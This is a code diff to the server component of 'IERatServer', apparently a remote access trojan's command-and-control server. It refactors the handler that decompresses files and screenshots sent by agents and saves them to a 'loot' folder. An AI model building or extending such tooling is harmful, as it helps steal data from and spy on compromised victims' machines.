@@ -1,6 +1,5 @@
 ﻿using System;
 using System.IO;
-using System.IO.Compression;
 
 namespace IERatServer.lib
 {
@@ -21,21 +20,24 @@ namespace IERatServer.lib
                 }
                 var filepath = Path.Combine(CLI.LootFolder, Filename);
                 var destinationFile = File.Create(filepath);
-                var fileBytes = Decompress(Convert.FromBase64String(taskObject.Result));
+                var fileBytes = ServerUtils.Decompress(Convert.FromBase64String(taskObject.Result));
                 destinationFile.Write(fileBytes);
-
+                destinationFile.Close();
+                
+                Console.ForegroundColor = ConsoleColor.Green;
                 if (taskObject.Type == "download")
                 {
-                    Console.WriteLine($"\nDownload was successfull to [{filepath}]\n");
+                    CLI.ScreenMessage($"Download was successfull to [{filepath}]");
                     Logger.Log("info", $"Download was successfull from agent {requestobject.AgentID} [{taskObject.args}]");
                     taskObject.Result = $"Successfully downloaded to {filepath}";
                 }
                 if (taskObject.Type == "screenshot")
                 {
-                    Console.WriteLine($"\nScreenshot saved successfully to {filepath}\n");
+                    CLI.ScreenMessage($"Screenshot saved successfully to {filepath}");
                     Logger.Log("info", $"Screenshot was successfull saved from agent {requestobject.AgentID} to file {filepath}");
                     taskObject.Result = "Screenshot saved successfully";
                 }
+                Console.ForegroundColor = ConsoleColor.White;
 
                 Db.TaskHistory.Add(new TaskHistoryObject() {
                     AgentNumber = ActiveChannel.InteractNum,
@@ -48,22 +50,6 @@ namespace IERatServer.lib
                 Console.WriteLine(ex.Message);
                 Logger.Log("error", ex.Message);
             }
-        }
-        public static byte[] Compress(byte[] data)
-        {
-            using var compressedStream = new MemoryStream();
-            using var zipStream = new GZipStream(compressedStream, CompressionMode.Compress);
-            zipStream.Write(data, 0, data.Length);
-            zipStream.Close();
-            return compressedStream.ToArray();
-        }
-        static byte[] Decompress(byte[] data)
-        {
-            using var compressedStream = new MemoryStream(data);
-            using var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress);
-            using var resultStream = new MemoryStream();
-            zipStream.CopyTo(resultStream);
-            return resultStream.ToArray();
         }
     }
 }
